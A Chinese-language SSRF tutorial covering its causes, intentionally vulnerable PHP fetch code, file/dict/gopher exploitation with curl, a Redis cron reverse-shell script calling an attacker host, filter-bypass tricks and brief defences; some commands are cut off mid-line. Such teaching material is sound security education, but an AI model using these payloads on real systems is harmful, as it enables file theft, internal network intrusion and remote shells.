---
title: SSRF服务端请求伪造
---

# SSRF服务端请求伪造

## SSRF漏洞原理

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。

一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）

数据流：攻击者--->服务器--->目标地址

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240619113821033.png)

### SSRF漏洞产生原因

SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。

如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。

### 容易出现SSRF的地方

1. 转码服务
2. 在线翻译
3. 图片加载与下载(通过URL地址加载或下载图片)
4. 图片、文章收藏功能
5. 网站采集、网页抓取的地方。
6. 头像的地方。(远程加载头像)
7. 一切要你输入网址的地方和可以输入ip的地方。
8. 从URL关键字中寻找：

```
share
wap
url
link
src
source
target
u
3g
display
sourceURl
imageURL
domain
...
```

### 利用SSRF可以实现的攻击

1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的[banner 信息](https://www.cnblogs.com/yuanshu/p/11588341.html)
2. 攻击运行在内网或本地的应用程序
3. 对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)
4. 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)
5. 下载内网资源(如：利用

file协议读取本地文件等)

1. 进行跳板
2. 无视cdn
3. 利用Redis未授权访问，HTTP CRLF注入实现getshell

## SSRF漏洞相关函数和协议

### **函数**

file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞

（1）file_get_contents()

```
<?php 
$url = $_GET['url'];; 
echo file_get_contents($url); 
?>
```

file_get_content函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。

（2）fsockopen()

```
<?php 
function GetFile($host,$port,$link) { 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);   
    if (!$fp) { 
        echo "$errstr (error number $errno) \n"; 
    } else { 
        $out = "GET $link HTTP/1.1\r\n"; 
        $out .= "Host: $host\r\n"; 
        $out .= "Connection: Close\r\n\r\n"; 
        $out .= "\r\n"; 
        fwrite($fp, $out); 
        $contents=''; 
        while (!feof($fp)) { 
            $contents.= fgets($fp, 1024); 
        } 
        fclose($fp); 
        return $contents; 
    } 
}
?>
```

fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限

（3）curl_exec()

```
<?php  if (isset($_POST['url'])){    $link = $_POST['url'];    $curlobj = curl_init();// 创建新的 cURL 资源    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源     $filename = './curled/'.rand().'.txt';    file_put_contents($filename, $result);     echo $result; } ?>
```

curl_exec函数用于执行指定的cURL会话

**注意**

```
1.一般情况下PHP不会开启fopen的gopher wrapper 

2.file_get_contents的gopher协议不能URL编码 

3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 

4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 

5.curl_exec() //默认不跟踪跳转， 

6.file_get_contents() // file_get_contents支持php://input协议
```

### 协议

（1）`file`： 在有回显的情况下，利用 file 协议可以读取任意内容

（2）`dict`：泄露安装软件版本信息，查看端口，操作内网redis服务等

（3）`gopher`：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell

（4）`http/s`：探测内网主机存活

## SSRF漏洞利用

### 本地利用

以curl举例，查看 curl 支持的协议列表 curl -V

（1）使用file协议 file protocol (任意文件读取)

```
curl -vvv 'file:///etc/passwd'
```

（2）使用dict协议 dict protocol (获取Redis配置信息)

```
curl -vvv 'dict://127.0.0.1:6379/info'
```

（3）使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)

**远程利用方式**

1.利用`file`协议

任意文件读取

```
curl -v 'http://x.x.x.x:xxxx/ssrf.php?url=fil
```

2.利用`dict`协议

（1）查看端口及端口上运行服务的版本信息

```
curl -v 'http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/'
```

说明22端口开放

（2）通过dict协议getshell

有关dict协议：向服务器的端口请求 命令:参数，并在末尾自动补上\r\n(CRLF)。

dict协议要一条一条的执行，而gopher协议执行一条命令就行了。

一条一条的执行就可以了。

3.利用gopher协议

（1）攻击内网redis并反弹shell

利用redis未授权访问攻击redis

攻击redis的exp

```
echo -e "\n\n\n*/1 * * * * bash -i >& /dev/tcp/x.x.x.x/1234 0>&1\n\n\n"|redis-cli -h $1 -p $2 -x set 1 

redis-cli -h $1 -p $2 config set dir /var/spool/cron/ 

redis-cli -h $1 -p $2 config set dbfilename root 

redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit
```

```
bash shell.sh x.x.x.x 6379
```

从而捕获到数据，并进行转换

转换规则如下：

如果第一个字符是>或者<那么丢弃该行字符串，表示请求和返回的时间。

如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。

将\r字符串替换成%0d%0a

空白行替换为%0a

结合gopher协议攻击内网redis，使用上边捕获数据的转换结果即可，然后进行反弹shell：

```
curl -v 'http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.x.x:6379/_curl -v
```

反弹成功

4 .利用http/s协议

探测内网主机存活

## SSRF漏洞相关绕过

### 常见绕过方法

**1、@**

http://abc@127.0.0.1 

实际上是以用户名abc连接到站点127.0.0.1，同理

 http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8

在对@解析域名中，不同的处理函数存在处理差异，如：

http://www.aaa.com@www.bbb.com@www.ccc.com

在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com

**2.利用[::]**

可以利用[::]来绕过localhost

```
http://[::]:80/  >>>  http://127.0.0.1http://[::]:80/  >>> 
```

**3.添加端口号**

http://127.0.0.1:8080

**4.利用短网址**

[站长工具短网址](http://tool.chinaz.com/tools/dwz.aspx)

**5.利用特殊域名**

127.0.0.1.xip.io，可解析为127.0.0.1

在域名上设置A记录，指向127.0.1

**7.利用进制转换**

127.0.0.1八进制：0177.0.0.1十六进制：0x7f.0.0.1十进制：2130706433

**8.句号**

127。0。0。1  >>>  127.0.0.1

**9.302跳转**

使用[https://tinyurl.com生成302跳转地址](https://tinyurl.xn--com302-u20k9dv69h8r7bzc7cjyd/)

### 常见限制

**1.限制为**[**http://www.xxx.com**](http://www.xxx.com) **域名**

采用http基本身份认证的方式绕过。即@

http://www.xxx.com@www.xxc.com

**2.限制请求IP不为内网地址**

当不允许ip为内网地址时

（1）采取短网址绕过

（2）采取特殊域名

（3）采取进制转换

**3.限制请求只为http协议**

（1）采取302跳转

（2）采取短地址

**SSRF漏洞防御**

1、禁用不需要的协议(如：file:///、gopher://,dict://等)。仅仅允许http和https请求

2、统一错误信息，防止根据错误信息判断端口状态

3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址

4、设置URL白名单或者限制内网IP
